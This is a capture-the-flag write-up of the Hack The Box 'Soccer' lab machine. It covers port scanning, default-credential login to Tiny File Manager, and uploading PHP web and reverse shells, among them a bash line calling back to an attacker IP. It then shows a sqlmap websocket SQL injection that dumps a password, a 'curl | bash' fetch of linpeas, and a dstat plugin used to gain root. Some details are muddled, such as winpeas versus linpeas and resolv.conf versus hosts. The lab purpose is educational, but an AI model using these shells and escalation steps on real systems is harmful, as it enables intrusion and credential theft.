---
title: Hack The Box - CTF Lab - Soccer - Easy
date: 2025-04-18 00:00:01 +0800
image: /images/Soccer.png
categories: [HTB Labs]
tags: [CPTS, Easy]
---
Soccer is an easy difficulty Linux machine that features a foothold based on default credentials, forfeiting access to a vulnerable version of the "Tiny File Manager", which in turn leads to a reverse shell on the target system ("CVE-2021-45010"). Enumerating the target reveals a subdomain which is vulnerable to a blind SQL injection through websockets. Leveraging the SQLi leads to dumped "SSH" credentials for the "player" user, who can run "dstat" using "doas"- an alternative to "sudo". By creating a custom "Python" plugin for "doas", a shell as "root" is then spawned through the "SUID" bit of the "doas" binary, leading to fully escalated privileges.

We start with an nmap scan:
```
sudo nmap -sC -sV -p- 10.10.11.194

Nmap scan report for 10.10.11.194
Host is up (0.025s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Thu, 17 Apr 2025 12:55:21 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Thu, 17 Apr 2025 12:55:21 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.94SVN%I=7%D=4/17%Time=6800FA34%P=x86_64-pc-linux-gnu%r
SF:(informix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clos
SF:e\r\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection
SF::\x20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found
SF:\r\nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type
SF:-Options:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
SF:nContent-Length:\x20139\r\nDate:\x20Thu,\x2017\x20Apr\x202025\x2012:55:
SF:21\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20l
SF:ang=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\
SF:n</head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r
SF:(HTTPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-
SF:Policy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
SF:43\r\nDate:\x20Thu,\x2017\x20Apr\x202025\x2012:55:21\x20GMT\r\nConnecti
SF:on:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n
SF:<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pr
SF:e>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,
SF:"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20defaul
SF:t-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\
SF:x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Th
SF:u,\x2017\x20Apr\x202025\x2012:55:21\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=
SF:\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIO
SF:NS\x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP
SF:,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n
SF:")%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConn
SF:ection:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.75 seconds
```

We ping the machine and see that the TTL is 64, meaning that it is most likely a Linux machine. 

We have ports 22, 80, and 9091. We check ports 80 and 9091 to see if we can access a website. We try port 9091 and see that there is an error in the get request. We then check port 80 and see that it is inaccessible, however it seems it is redirecting us to the hostname soccer.htb, which may not have a DNS record on the local DNS server. We can try adding it to our /etc/resolv.conf file. 
```
soccer.htb 10.10.11.194
```
and we see that we can now reach the website by typing in soccer.htb on the browser.

We try a gobuster query:
```
gobuster dir -u http://soccer.htb/ -w SecLists/Discovery/Web-Content/raft-small-words.txt

/.html                (Status: 403) [Size: 162]
/.htm                 (Status: 403) [Size: 162]
/.                    (Status: 200) [Size: 6917]
/.htaccess            (Status: 403) [Size: 162]
/.htc                 (Status: 403) [Size: 162]
/.html_var_DE         (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/.html.               (Status: 403) [Size: 162]
/.html.html           (Status: 403) [Size: 162]
/.htpasswds           (Status: 403) [Size: 162]
/.htm.                (Status: 403) [Size: 162]
/.htmll               (Status: 403) [Size: 162]
/.html.old            (Status: 403) [Size: 162]
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
/.html.bak            (Status: 403) [Size: 162]
/.ht                  (Status: 403) [Size: 162]
/.htm.htm             (Status: 403) [Size: 162]
/.htgroup             (Status: 403) [Size: 162]
/.hta                 (Status: 403) [Size: 162]
/.html1               (Status: 403) [Size: 162]
/.html.printable      (Status: 403) [Size: 162]
/.html.LCK            (Status: 403) [Size: 162]
/.htm.LCK             (Status: 403) [Size: 162]
/.htaccess.bak        (Status: 403) [Size: 162]
/.htx                 (Status: 403) [Size: 162]
/.htmls               (Status: 403) [Size: 162]
/.htuser              (Status: 403) [Size: 162]
/.htlm                (Status: 403) [Size: 162]
/.html-               (Status: 403) [Size: 162]
/.htm2                (Status: 403) [Size: 162]
```

And we see the tiny file manager at this directory: http://soccer.htb/tiny/

We look up default credentials on Google and find this pair: admin/admin@123

We enter it and miraculously it works:
![image tooltip](/images/Screenshot%202025-04-25%20192146.png)

It seems that we can upload files, so since tiny file manager is a web-based php file manager, we try several php shells but the below cannot be uploaded:
```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/4443 0>&1'");
?>

<?php system($_GET['cmd']);?>

<?php system($_REQUEST["cmd"]); ?>
```

We try a reverse shell that uses the fsockopen() function in php: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

and it works:
```
Listening on 0.0.0.0 4443
Connection received on 10.10.11.194 51554
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 01:45:25 up 9 min,  0 users,  load average: 0.00, 0.04, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

We then use the following to upgrade our shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
suspend with CTRL - Z
stty raw -echo
fg
export TERM=xterm
```

We then check for any vhosts by going to the /etc folder and browsing the /nginx, /apache2, and the /httpd folders for any web server configuration files. We find one at /etc/nginx/site-enabled which shows the default hostname configuration and then the additional vhost called "soc-player.soccer.htb"
```
www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb 
server {
	listen 80;
	listen [::]:80;

	server_name soc-player.soccer.htb;

	root /root/app/views;

	location / {
		proxy_pass http://localhost:3000;
		proxy_http_version 1.1;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_set_header Host $host;
		proxy_cache_bypass $http_upgrade;
	}

}
```
We then add the FQDN to our /etc/hosts file in our Linux machine:
```
10.10.11.194 soccer.htb soc-player.soccer.htb
```
We then try to access the website, but just writing soc-player.soccer.htb on Mozilla Firefox or Chrome just enters the name as a Google search. For the browser to treat the FQDN as a website and not a Google search, we need to put a forward slash:
```
soc-player.soccer.htb/
```
Now we see the website.

We browse through the website and notice that we can easily create an account using an arbitrary email address and password. We can instantly login without email verification and see that it has created a ticket ID for us. We enter in the ticket ID in the query box and it says our ticket exists. If we enter in a random number, it says our ticket does not exist.

This can potentially be a SQL injection, so we test with SQL queries.

The standard query doesn't work:
```
100' OR 1=1-- -

This ticket does not exist
```

But we also try this query incase the backend is not taking in a string but a raw number:
```
$sql = "SELECT * FROM users WHERE user_id = $user_id"; //backend takes in number only
```
and so 
100' OR 1=1-- - would give you a quotation error
while
100 OR 1=1-- - is a valid SQL injection

![image tooltip](/images/Screenshot%202025-05-07%20211412.png)

We then open BurpSuite to intercept the request when entering the SQL injection where we get the following WebSocket request:
```
{
	"id":"100 OR 1=1-- -"
}
```
We can then copy to file and use this with sqlmap specifying WebSocket:
```
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch
```
where we find a boolean-based blind sql injection:
```
sqlmap identified the following injection point(s) with a total of 119 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"id":"-9663 OR 8964=8964"}

```
To clarify why we need port 9091, it is because the intercepted request from Burpsuite shows that the WebSocket request is being sent to http://soc-player.soccer.htb:9091/

Now we add the --dbs subcommand to get the list of databases 
```
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch --dbs --threads 10

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```

And then we choose a database and use the -D and --dump subcommands to choose the database and dump the database. 
```
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch --dbs --threads 10 -D soccer_db --dump

Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```
and we got a username/password pair:

player@player.htb and PlayerOftheMatch2022

We can now try logging into the site soc-player.soccer.htb with these credentials, however after logging in we find nothing. We can also try going back to the reverse shell we made at the Tiny File Manager subdirectory and try logging in to the "player" user. 

```
su player
cd /home/player
cat user.txt

bc66cd6a267065d27bd7df56f0f53c9b
```
And as you can see, we find the user.txt flag.

### User.txt found

Now that we have the user account, we can check for additional permissions.

We run 
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
to see if we have any SETUID permissions that allow us to run a file as the owner of the file.

We find an interesting file

```
-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
```
where we can execute the file as the owner, who is root. 

We can also use LINPEAS (https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) to find any exploitations that may be on the host. 

We setup a directory on our attack box and create a python web server to host the winpeas.sh file. We note that our attack box ip is 10.10.14.7 

```
sudo mkdir www
sudo mv ~/Downloads/winpeas.sh .
sudo python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
And then we can use the curl command to access winpeas.sh
```
curl 10.10.14.7:8000/linpeas.sh | bash
```
From LINPEAS we also see /usr/local/bin/doas as a possible privesc. The reason why we focus specifically on /usr/local/bin/doas compared to other files that we can run as root is because files in the /local directory are user or admin managed rather than system managed, meaning that they are likely manually downloaded and may have additional rights. 

We then search for any files on the system that contain the word "doas"
```
find / -type f -name "*doas*" 2>/dev/null

/usr/local/share/man/man5/doas.conf.5
/usr/local/share/man/man1/doas.1
/usr/local/share/man/man8/vidoas.8
/usr/local/share/man/man8/doasedit.8
/usr/local/bin/doasedit
/usr/local/bin/doas
/usr/local/bin/vidoas
/usr/local/etc/doas.conf
```
and we see the interesting configuration file "doas.conf" and we run the cat command to see the configuration:

```
cat /usr/local/etc/doas.conf 

permit nopass player as root cmd /usr/bin/dstat
```
The configuration tells us that we can run /usr/bin/dstat as root using the doas program.

If we run 
```
find / -group player 2>/dev/null | grep -v '^/proc\|^/run\|^/sys' 
 
/usr/local/share/dstat
/home/player
/home/player/.cache
/home/player/.cache/motd.legal-displayed
/home/player/.bash_logout
/home/player/.bashrc
/home/player/.profile
/home/player/user.txt
```
We see all the files/folders that we have group access to.

We notice that we have access to the /usr/local/share/dstat folder, which is most likely linked to the /usr/bin/dstat executable. 

If we explore the /usr/bin/dstat command, we notice that we can import plugins:
```
cd /usr/bin
dstat --help | grep plugin

--list list all available plugins
--<plugin name> enable external plugin by name (see --list)
```
And we see that we can enable external plugins that are from the file /usr/share/dstat if we use the dstat --list command. 

We can check GTFObins, a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems, to see if we have anything for the binary dstat.

We see https://gtfobins.github.io/gtfobins/dstat/

and use the following commands in the plugin directory to create a new python plugin to give us a system shell:

```
echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
doas /usr/bin/dstat --xxx

whoami

root

cd /root
cat root.txt

a2a69c40ba21aa0192377b2b61d03803
```
and we finally acquire the final flag root.txt

### root.txt found

In this box, we have primarily abused the Tiny File Manager located on the website's subdirectory since it used the default admin credentials of admin/admin123@ and used the file manager to launch a reverse web shell to our netcat listener. We also found an additional vhost through our web shell by browsing to our /etc/ directory called soc-player.soccer.htb which contains a SQL injection that got us user credentials which contained permissions to launch the "doas" program which allows us to launch the "dstat" binary as root. We then escalated our shell to root by using the dstat exploit on GTFObins.


